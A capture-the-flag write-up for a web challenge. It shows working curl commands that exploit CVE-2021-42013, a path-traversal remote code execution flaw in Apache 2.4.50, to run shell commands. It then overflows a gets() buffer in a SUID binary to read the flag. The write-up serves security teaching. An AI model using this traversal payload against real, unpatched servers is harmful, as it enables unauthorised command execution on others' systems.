# CTF - Web - Path to Blog / [408 pts]

![Screenshot](img/Capture.JPG)  
 
```bash
curl -I 'http://ctf-metared-2021.ua.pt:24202'

HTTP/1.1 200 OK
Date: Fri, 17 Dec 2021 10:49:35 GMT
Server: Apache/2.4.50 (Unix)
```
CVE-2021-42013 RCE Apache 2.4.50
```bash
curl 'http://ctf-metared-2021.ua.pt:24202/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type: text/plain; echo; ls -la'

-rwsr-sr-x 1 root root   24760 Dec  4 17:28 read_flag
-rw-r--r-- 1 root root     533 Dec  4 17:28 read_flag.c
```
SUID Binary
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    char tmp;
    char input[32];
    int uid;

    uid = getuid();
    printf("Enter secret string: ");
    gets(input);
    if (uid == 0) {
        FILE *fp = fopen("/root/flag.txt", "r");
        if (fp == NULL) {
            printf("Failed to open the file!\n");
            exit(0);
        }
        tmp = fgetc(fp);
        while (tmp != EOF) {
            printf("%c", tmp);
            tmp = fgetc(fp);
        }
        fclose(fp);
    }
}
```
Buffer overflow Overwrite
````bash
curl 'http://ctf-metared-2021.ua.pt:24202/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type: text/plain; echo; echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa0" | ./read_flag'


Enter secret string: CTFUA{P4th_n0rm4lize_g0n3_wRonG}
```
